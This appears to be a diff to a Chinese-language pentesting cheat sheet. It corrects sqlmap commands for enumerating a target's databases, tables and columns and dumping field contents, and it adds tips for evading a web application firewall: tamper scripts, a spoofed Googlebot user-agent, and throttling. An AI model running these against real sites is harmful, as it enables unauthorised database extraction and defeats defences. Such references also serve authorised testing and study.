@@ -170,12 +170,13 @@ cluster bomb
 ## sqlmap
 
 
-sqlmap.py -u url --dbms                 爆数据库
-sqlmap.py -u url --dbms "数据库名" --table              爆数据库表
+sqlmap.py -u url --dbms                 爆后端数据库
+sqlmap.py -u url --dbms "数据库名" --dbs 
+sqlmap.py -u url --dbms "数据库名" --tables              爆数据库表
 sqlmap.py -u url --dbms "数据库名" --current-db             显示当前连接数据库名
-sqlmap.py -u url --dbms "数据库名" --tables  -D "表名"                   列出数据库表中的表名
+sqlmap.py -u url --dbms "数据库名" --tables  -D "数据库名"                   列出数据库表中的表名
 sqlmap.py -u url --dbms "数据库名" --columns  -T "表名" -D "数据库名"         列出数据库名中的表名内容
-sqlmap.py -u url --dbms  "数据库名"  --dump  -C "字段,字段"  -T "表名" -D "数据库表"       获取字段里面的内容
+sqlmap.py -u url --dbms "数据库名" --dump  -C "字段,字段"  -T "表名" -D "数据库名"       获取字段里面的内容
 
 * option
 
@@ -200,15 +201,19 @@ txt文件
     ```
 
 * 大量出现 unable to connect ，表明流量被WAF拦截
+
 1 使用tamper 
+
 2
 --user-agent "Googlebot (http://www.google.com/)
 --user-agent="Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0"
+
 3 设置延迟时间或线程数
 --threads 线程数
 --delay 延迟
 
-# 绕过 waf 的tamper
+### 绕过 waf 的tamper
+
 01. apostrophemask.py        用UTF-8全角字符替换单引号字符
 
 02. apostrophenullencode.py        用非法双字节unicode字符替换单引号字符
